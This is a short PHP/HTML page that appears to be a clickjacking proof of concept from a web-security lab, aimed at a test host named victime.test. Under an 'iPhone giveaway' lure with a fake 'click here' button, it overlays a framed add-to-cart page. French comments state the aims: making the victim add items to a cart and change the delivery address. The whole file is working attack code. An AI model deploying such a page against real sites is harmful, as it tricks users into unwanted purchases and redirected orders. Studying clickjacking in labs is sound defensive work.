<?php
ini_set('session.cookie_samesite', 'None');
ini_set('session.cookie_secure', 'true');
session_start();
?>
<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <title>Gagnez un iPhone !</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.9;
            /* Rend l'iframe invisible */
        }

        .fake-button {
            position: absolute;
            top: 110px;
            left: 10px;
            width: 150px;
            height: 30px;
            background-color: red;
            color: white;
            text-align: center;
            line-height: 50px;
            font-weight: bold;
            cursor: pointer;
            opacity: 0.2;
        }
    </style>
</head>
<!-- faire ajouter des articles au panier via l'utilisateur -->
<!-- changer l'adresse de livraison -->

<body>
    <div class="fake-button">Cliquez ici !</div>
    <iframe src="https://victime.test/add_product.php"></iframe>
</body>

</html>